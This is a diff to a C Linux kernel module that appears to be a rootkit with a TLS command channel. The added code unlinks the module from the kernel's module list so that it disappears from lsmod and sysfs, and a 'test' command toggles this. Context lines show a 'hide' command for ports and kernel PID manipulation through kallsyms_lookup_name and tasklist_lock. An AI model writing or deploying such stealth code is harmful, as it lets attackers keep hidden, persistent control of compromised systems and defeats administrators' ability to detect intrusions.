@@ -32,10 +32,37 @@
 #define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
 #endif
 
+int hidden = 0;
+static struct list_head *mod_list;
+
+void hide(void) {
+    if (hidden)
+        return;
+
+    while (!mutex_trylock(&module_mutex))
+        cpu_relax();
+    mod_list = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    kfree(THIS_MODULE->sect_attrs);
+    THIS_MODULE->sect_attrs = NULL;
+    mutex_unlock(&module_mutex);
+    hidden = 1;
+}
+
+void show(void) {
+    if (!hidden)
+        return;
+
+    while (!mutex_trylock(&module_mutex))
+        cpu_relax();
+    list_add(&THIS_MODULE->list, mod_list);
+    mutex_unlock(&module_mutex);
+    hidden = 0;
+}
+
 static asmlinkage void (*change_pidR)(
         struct task_struct* task, enum pid_type type, struct pid* pid);
 static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
-
 
 struct service {
     struct socket* tls_socket;
@@ -295,6 +322,7 @@ int read_TLS(void) {
             strcpy(buffer, clear);
             send_msg(svc->tls_socket, buffer, strlen(clear));
         } else if (memcmp("test", buffer, 4) == 0) {
+#if 0
             for_each_process(ts) {
                 printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
                 //if (strcmp("userspace.elf", proc_name) == 0) {
@@ -307,6 +335,13 @@ int read_TLS(void) {
                     newpid->numbers[0].nr = 76831;
                 }
             }
+#else
+            if (hidden) {
+                show();
+            } else {
+                hide();
+            }
+#endif
         } else if (memcmp("hide", buffer, 4) == 0) {
             if (kstrtou16(buffer + 5, 10, &tmp_port)) {
                 strcpy(buffer, bad_port);
@@ -321,7 +356,6 @@ int read_TLS(void) {
 
                     //newpid = get_task_pid(ts, PIDTYPE_PID);
                     //newpid->numbers[0].nr = 761;
-
 
                     lo = kallsyms_lookup_name("tasklist_lock");
                     write_lock(lo);
